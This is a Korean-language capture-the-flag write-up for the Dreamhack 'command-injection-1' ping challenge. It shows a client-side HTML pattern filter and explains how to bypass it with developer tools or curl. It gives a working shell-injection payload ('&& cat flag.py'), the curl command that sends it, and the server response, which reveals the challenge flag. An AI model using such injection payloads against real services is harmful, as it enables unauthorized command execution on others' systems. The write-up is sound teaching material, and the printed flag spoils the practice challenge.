@@ -1,0 +1,135 @@
+			command-injection-1:
+		client side filtering 우회 방법
+
+
+					Problem AUTHOR: dreamhack
+					Article Author: Kown Young Jung
+
+
+
+---[ Contents
+     1. command-injection-1
+     2. client side filtering 우회 방법
+     3. 문제 풀이
+
+
+
+
+
+1. command-injection-1
+ 문제는 다음과 같이 제시된다.
+
+======================================================================
+---[ 문제 정보
+특정 Host에 ping 패킷을 보내는 서비스입니다.
+Command Injection을 통해 플래그를 획득하세요. 플래그는 flag.py에 있습니다.
+
+---[ 문제 파일
+app.py, requirements.txt, static/, templates/
+======================================================================
+
+주어진 문제 파일을 분석해보면 host를 입력으로 받아서 그 host에 ping 명령어를
+실행시키는 동작을 수행함을 알 수 있다. Server에서 입력에 대한 검증을 수행하지
+않으므로 command injection 취약점이 발생할 수 있다.
+
+2. client side filtering 우회 방법
+ 그러나 문제 사이트에 접속하여 다음과 같은 입력을 주어도 형식에 맞추라는
+메시지만 표시될 뿐이다.
+
+======================================================================
+0.0.0.0" && cat flag.py"
+======================================================================
+
+그 이유는 해당 페이지의 소스를 보면 알 수 있는데, 바로 다음과 같은 코드
+때문이다.
+
+======================================================================
+<form method="POST">
+  <div class="row">
+    <div class="col-md-6 form-group">
+      <label for="Host">Host</label>
+      <input type="text" class="form-control" id="Host"
+      placeholder="8.8.8.8" name="host" pattern="[A-Za-z0-9.]{5,20}"
+      required>
+    </div>
+  </div>
+
+  <button type="submit" class="btn btn-default">Ping!</button>
+</form>
+======================================================================
+
+위 코드를 보면 pattern으로 사용자 입력을 검증하고 있다는 것을 알 수 있다.
+그러나 이는 쉽게 우회할 수 있는데 그 방법에는 개발자 도구로 pattern 검증
+코드를 지우는 것과 네트워크 프로그램으로 입력을 전달하는 것이다. 이는 client
+side에서 입력을 검증하는 코드에 적용될 수 있을 것이다.
+
+3. 문제 풀이
+ 2.에서 어떤 입력을 어떻게 전달할 것인가에 대해 살펴보았다. 여기서는 네트워크
+프로그램은 curl을 사용하여 입력을 전달할 것이다. 터미널에 다음과 같은 명령어를
+입력하면 된다.
+
+======================================================================
+curl -F "host=0.0.0.0\" && cat flag.py\"" \
+[접속 정보]/ping
+======================================================================
+
+그럼 다음과 같은 HTML 소스가 응답으로 출력되고 FLAG가 포함되어 있다는 것을
+확인할 수 있을 것이다.
+
+======================================================================
+<!doctype html>
+<html>
+  <head>
+    <link rel="stylesheet" href="/static/css/bootstrap.min.css">
+    <link rel="stylesheet" href="/static/css/bootstrap-theme.min.css">
+    <link rel="stylesheet" href="/static/css/non-responsive.css">
+    <title>ping result | Dreamhack Ping Tester</title>
+
+
+
+  </head>
+<body>
+
+    <!-- Fixed navbar -->
+    <nav class="navbar navbar-default navbar-fixed-top">
+      <div class="container">
+        <div class="navbar-header">
+        <a class="navbar-brand" href="/">Home</a>
+        </div>
+        <div id="navbar">
+          <ul class="nav navbar-nav">
+            <li><a href="/ping">Ping</a></li>
+          </ul>
+
+        </div><!--/.nav-collapse -->
+      </div>
+    </nav>
+
+    <div class="container">
+
+<h1>Ping Result Result</h1><br/>
+
+
+  <pre>PING 0.0.0.0 (0.0.0.0): 56 data bytes
+64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.049 ms
+64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.085 ms
+64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.089 ms
+
+--- 0.0.0.0 ping statistics ---
+3 packets transmitted, 3 packets received, 0% packet loss
+round-trip min/avg/max = 0.049/0.074/0.089 ms
+FLAG = &#39;DH{pingpingppppppppping!!}&#39;
+</pre>
+
+
+<a type="button" class="btn btn-link"
+href="javascript:history.back(-1);">Back</a>
+
+    </div> <!-- /container -->
+
+    <!-- Bootstrap core JavaScript -->
+    <script src="/static/js/jquery.min.js"></script>
+    <script src="/static/js/bootstrap.min.js"></script>
+</body>
+</html>
+======================================================================
